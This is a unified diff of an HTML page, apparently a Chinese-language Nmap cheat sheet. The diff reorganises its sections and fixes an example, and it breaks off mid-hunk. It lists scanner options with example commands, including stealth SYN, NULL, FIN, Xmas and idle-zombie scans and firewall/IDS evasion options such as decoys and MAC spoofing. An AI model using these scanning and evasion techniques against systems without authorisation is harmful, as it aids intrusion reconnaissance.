@@ -3,14 +3,28 @@
 &lt;h3&gt;目录&lt;/h3&gt;
 &lt;nav id="TableOfContents"&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;a href="#主机发现"&gt;主机发现&lt;/a&gt;
+&lt;li&gt;&lt;a href="#目标选择与管理"&gt;目标选择与管理&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#-il"&gt;&lt;code&gt;-iL&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#-ir"&gt;&lt;code&gt;-iR&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#--exclude"&gt;&lt;code&gt;--exclude&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#--excludefile"&gt;&lt;code&gt;--excludefile&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#--resume"&gt;&lt;code&gt;--resume&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#主机发现与存活探测"&gt;主机发现与存活探测&lt;/a&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href="#-sn"&gt;&lt;code&gt;-sn&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="#-sp"&gt;&lt;code&gt;-sP&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="#-pn"&gt;&lt;code&gt;-Pn&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#-ps"&gt;&lt;code&gt;-PS&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#-pa"&gt;&lt;code&gt;-PA&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#-pu"&gt;&lt;code&gt;-PU&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#-pi"&gt;&lt;code&gt;-PI&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#-p0"&gt;&lt;code&gt;-P0&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;&lt;a href="#端口扫描"&gt;端口扫描&lt;/a&gt;
+&lt;li&gt;&lt;a href="#端口扫描技术"&gt;端口扫描技术&lt;/a&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href="#-ss"&gt;&lt;code&gt;-sS&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="#-st"&gt;&lt;code&gt;-sT&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
@@ -18,35 +32,18 @@
 &lt;li&gt;&lt;a href="#-sn-1"&gt;&lt;code&gt;-sN&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="#-sf"&gt;&lt;code&gt;-sF&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="#-sx"&gt;&lt;code&gt;-sX&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#-sｉ"&gt;&lt;code&gt;-sＩ&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#-si"&gt;&lt;code&gt;-sI&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#端口规范"&gt;端口规范&lt;/a&gt;
+&lt;ul&gt;
 &lt;li&gt;&lt;a href="#-p"&gt;&lt;code&gt;-p&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#-p0"&gt;&lt;code&gt;-P0&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#-pu"&gt;&lt;code&gt;-PU&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#-ps"&gt;&lt;code&gt;-PS&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#-pa"&gt;&lt;code&gt;-PA&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#-pi"&gt;&lt;code&gt;-PI&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="#-p-"&gt;&lt;code&gt;-p-&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="#--top-ports"&gt;&lt;code&gt;--top-ports&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="#-f"&gt;&lt;code&gt;-F&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#-il"&gt;&lt;code&gt;-iL&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#-ir"&gt;&lt;code&gt;-iR&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#-exclude"&gt;&lt;code&gt;-exclude&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#-excludefile"&gt;&lt;code&gt;-excludefile&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#-n"&gt;&lt;code&gt;-n&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#-r"&gt;&lt;code&gt;-R&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#-e"&gt;&lt;code&gt;-e&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#-6"&gt;&lt;code&gt;-6&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#--traceroute"&gt;&lt;code&gt;--traceroute&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#--system-dns"&gt;&lt;code&gt;--system-dns&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#--spoof-mac"&gt;&lt;code&gt;--spoof-mac&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#--badsum"&gt;&lt;code&gt;--badsum&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#--resume"&gt;&lt;code&gt;--resume&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#--privileged----unprivileged"&gt;&lt;code&gt;--privileged / --unprivileged&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#--source-port"&gt;&lt;code&gt;--source-port&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#--data-length"&gt;&lt;code&gt;--data-length&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;&lt;a href="#服务版本探测"&gt;服务/版本探测&lt;/a&gt;
+&lt;li&gt;&lt;a href="#服务和版本探测"&gt;服务和版本探测&lt;/a&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href="#-sv"&gt;&lt;code&gt;-sV&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="#--version-intensity"&gt;&lt;code&gt;--version-intensity&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
@@ -58,9 +55,9 @@
 &lt;li&gt;&lt;a href="#-a"&gt;&lt;code&gt;-A&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;&lt;a href="#nse脚本引擎"&gt;NSE脚本引擎&lt;/a&gt;
+&lt;li&gt;&lt;a href="#nse-脚本引擎"&gt;NSE 脚本引擎&lt;/a&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;a href="#-sc---scriptdefault"&gt;&lt;code&gt;-sC&lt;/code&gt; /&lt;code&gt;--script=default&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#-sc----scriptdefault"&gt;&lt;code&gt;-sC&lt;/code&gt; / &lt;code&gt;--script=default&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="#-scriptlua-scripts"&gt;&lt;code&gt;-script=&amp;lt;Lua scripts&amp;gt;&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="#-script-argsn1v1n2v2"&gt;&lt;code&gt;-script-args=&amp;lt;n1=v1,[n2=v2,...]&amp;gt;&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="#script-args-filefilename"&gt;&lt;code&gt;–script-args-file=filename&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
@@ -69,37 +66,115 @@
 &lt;li&gt;&lt;a href="#script-helpscripts"&gt;&lt;code&gt;–script-help=&amp;lt;scripts&amp;gt;&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;&lt;a href="#输出选项"&gt;输出选项&lt;/a&gt;
+&lt;li&gt;&lt;a href="#输出格式与详情"&gt;输出格式与详情&lt;/a&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href="#-on"&gt;&lt;code&gt;-oN&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="#-ox"&gt;&lt;code&gt;-oX&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="#-oa"&gt;&lt;code&gt;-oA&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#--append-output"&gt;&lt;code&gt;--append-output&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#-v---vv---d---dd"&gt;&lt;code&gt;-v&lt;/code&gt; / &lt;code&gt;-vv&lt;/code&gt; / &lt;code&gt;-d&lt;/code&gt; / &lt;code&gt;-dd&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#扫描结果筛选与解释"&gt;扫描结果筛选与解释&lt;/a&gt;
+&lt;ul&gt;
 &lt;li&gt;&lt;a href="#--open"&gt;&lt;code&gt;--open&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="#--reason"&gt;&lt;code&gt;--reason&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#调试与信息收集"&gt;调试与信息收集&lt;/a&gt;
+&lt;ul&gt;
 &lt;li&gt;&lt;a href="#--packet-trace"&gt;&lt;code&gt;--packet-trace&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="#--iflist"&gt;&lt;code&gt;--iflist&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#--append-output"&gt;&lt;code&gt;--append-output&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#-v-vv-d--dd"&gt;&lt;code&gt;-v&lt;/code&gt;/&lt;code&gt;-vv&lt;/code&gt;/&lt;code&gt;-d&lt;/code&gt;/&lt;code&gt; -dd&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#--traceroute"&gt;&lt;code&gt;--traceroute&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;&lt;a href="#性能与防火墙规避"&gt;性能与防火墙规避&lt;/a&gt;
+&lt;li&gt;&lt;a href="#网络与dns配置"&gt;网络与DNS配置&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#-n"&gt;&lt;code&gt;-n&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#-r"&gt;&lt;code&gt;-R&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#--system-dns"&gt;&lt;code&gt;--system-dns&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#-e"&gt;&lt;code&gt;-e&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#-6"&gt;&lt;code&gt;-6&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#性能与定时控制"&gt;性能与定时控制&lt;/a&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href="#-t0-5"&gt;&lt;code&gt;-T&amp;lt;0-5&amp;gt;&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#-f-1"&gt;&lt;code&gt;-f&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#-d"&gt;&lt;code&gt;-D&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#--scan-delay"&gt;&lt;code&gt;--scan-delay&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#--max-rate"&gt;&lt;code&gt;--max-rate&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="#--min-rate"&gt;&lt;code&gt;--min-rate&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#--max-rate"&gt;&lt;code&gt;--max-rate&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#--scan-delay"&gt;&lt;code&gt;--scan-delay&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#--min-parallelism----max-parallelism"&gt;&lt;code&gt;--min-parallelism&lt;/code&gt; / &lt;code&gt;--max-parallelism&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="#--max-retries"&gt;&lt;code&gt;--max-retries&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#--max-retries-1"&gt;&lt;code&gt;--max-retries&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#--min-parallelism----max-parallelism"&gt;&lt;code&gt;--min-parallelism / --max-parallelism&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#--ttl"&gt;&lt;code&gt;--ttl&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
+&lt;li&gt;&lt;a href="#防火墙ids规避与欺骗"&gt;防火墙/IDS规避与欺骗&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#-f-1"&gt;&lt;code&gt;-f&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#-d"&gt;&lt;code&gt;-D&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#--source-port"&gt;&lt;code&gt;--source-port&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#--data-length"&gt;&lt;code&gt;--data-length&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#--ttl"&gt;&lt;code&gt;--ttl&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#--spoof-mac"&gt;&lt;code&gt;--spoof-mac&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#--badsum"&gt;&lt;code&gt;--badsum&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#权限与运行模式"&gt;权限与运行模式&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#--privileged----unprivileged"&gt;&lt;code&gt;--privileged&lt;/code&gt; / &lt;code&gt;--unprivileged&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#附件--nmappdf"&gt;附件 nmap.pdf&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/nav&gt;
 &lt;/div&gt;
-&lt;h2 id="主机发现"&gt;主机发现
+&lt;ul&gt;
+&lt;li&gt;
+&lt;h2 id="目标选择与管理"&gt;目标选择与管理
+&lt;/h2&gt;&lt;h3 id="-il"&gt;&lt;code&gt;-iL&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;功能&lt;/strong&gt;：指定扫描主机列表&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -iL targets.txt&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;targets.txt&lt;/code&gt;内容示例：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;192.168.1.100
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;192.168.1.101
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;scanme.nmap.org
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="-ir"&gt;&lt;code&gt;-iR&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：随机选择扫描目标。随机扫描10个IP地址&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -iR 10 -Pn&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="--exclude"&gt;&lt;code&gt;--exclude&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：排除扫描目标&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap 192.168.1.0/24 --exclude 192.168.1.100,192.168.1.101&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="--excludefile"&gt;&lt;code&gt;--excludefile&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：排除文件中目标列表&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap 192.168.1.0/24 --excludefile exclude.txt&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="--resume"&gt;&lt;code&gt;--resume&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：从上次中断的地方继续扫描。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --resume scan.log&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="主机发现与存活探测"&gt;主机发现与存活探测
 &lt;/h2&gt;&lt;h3 id="-sn"&gt;&lt;code&gt;-sn&lt;/code&gt;
 &lt;/h3&gt;&lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：探测主机是否在线，不扫描端口&lt;/li&gt;
@@ -115,11 +190,36 @@
 &lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：跳过主机发现，将所有主机视为在线状态&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -Pn 192.168.1.100&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h2 id="端口扫描"&gt;端口扫描
+&lt;h3 id="-ps"&gt;&lt;code&gt;-PS&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：指定端口号，TCP SYN ping扫描。向指定端口发送SYN包进行主机发现&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -PS 80,443 192.168.1.0/24&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="-pa"&gt;&lt;code&gt;-PA&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：指定端口号，TCP ACK ping扫描。向指定端口发送ACK包，常用于穿透防火墙&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -PA 80,443 192.168.1.0/24&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="-pu"&gt;&lt;code&gt;-PU&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：指定端口号，UDP ping扫描。向目标UDP端口发送空包，根据响应判断主机是否在线&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -PU 53,161 192.168.1.0/24&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="-pi"&gt;&lt;code&gt;-PI&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：指定端口号，使用真正的ping ICMP echo请求扫描目标主机是否正在运行&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -PI 192.168.1.0/24&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="-p0"&gt;&lt;code&gt;-P0&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：指定端口号，无ping扫描。此参数已过时，使用&lt;code&gt;-Pn&lt;/code&gt;替代&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -P0 192.168.1.100&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="端口扫描技术"&gt;端口扫描技术
 &lt;/h2&gt;&lt;h3 id="-ss"&gt;&lt;code&gt;-sS&lt;/code&gt;
 &lt;/h3&gt;&lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：TCP SYN半开扫描，相对隐蔽&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -Pn 192.168.1.100&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -sS 192.168.1.100&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h3 id="-st"&gt;&lt;code&gt;-sT&lt;/code&gt;
 &lt;/h3&gt;&lt;ul&gt;
@@ -146,40 +246,16 @@
 &lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：TCP Xmas扫描，发送FIN、PSH和URG标志位的TCP包&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -sX 192.168.1.100&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h3 id="-sｉ"&gt;&lt;code&gt;-sＩ&lt;/code&gt;
+&lt;h3 id="-si"&gt;&lt;code&gt;-sI&lt;/code&gt;
 &lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：空闲扫描．通过&amp;quot;僵尸主机&amp;quot;进行隐蔽扫描&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：空闲扫描，通过“僵尸主机”进行隐蔽扫描&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -sI zombiehost:port target&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h3 id="-p"&gt;&lt;code&gt;-p&lt;/code&gt;
+&lt;h2 id="端口规范"&gt;端口规范
+&lt;/h2&gt;&lt;h3 id="-p"&gt;&lt;code&gt;-p&lt;/code&gt;
 &lt;/h3&gt;&lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：指定端口号&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -p 1-80 192.168.1.100&lt;/code&gt;、&lt;code&gt;nmap -p 80,443 192.168.1.100&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="-p0"&gt;&lt;code&gt;-P0&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：指定端口号，无ping扫描。此参数已过时，使用&lt;code&gt;-Pn&lt;/code&gt;替代&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -P0 192.168.1.100&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="-pu"&gt;&lt;code&gt;-PU&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：指定端口号，UDP ping扫描。向目标UDP端口发送空包，根据响应判断主机是否在线&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -PU 53,161 192.168.1.0/24&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="-ps"&gt;&lt;code&gt;-PS&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：指定端口号，TCP SYN ping扫描。向指定端口发送SYN包进行主机发现&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -PS 80,443 192.168.1.0/24&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="-pa"&gt;&lt;code&gt;-PA&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：指定端口号，TCP ACK ping扫描。向指定端口发送ACK包，常用于穿透防火墙&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -PA 80,443 192.168.1.0/24&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="-pi"&gt;&lt;code&gt;-PI&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：指定端口号，使用真正的ping ICMP echo请求扫描目标主机是否正在运行&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -PI 192.168.1.0/24&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h3 id="-p-"&gt;&lt;code&gt;-p-&lt;/code&gt;
 &lt;/h3&gt;&lt;ul&gt;
@@ -196,106 +272,7 @@
 &lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：快速扫描，减少扫描的端口数量&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -F 192.168.1.100&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h3 id="-il"&gt;&lt;code&gt;-iL&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;功能&lt;/strong&gt;：指定扫描主机列表&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -iL targets.txt&lt;/code&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;targets.txt&lt;/code&gt;内容示例：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
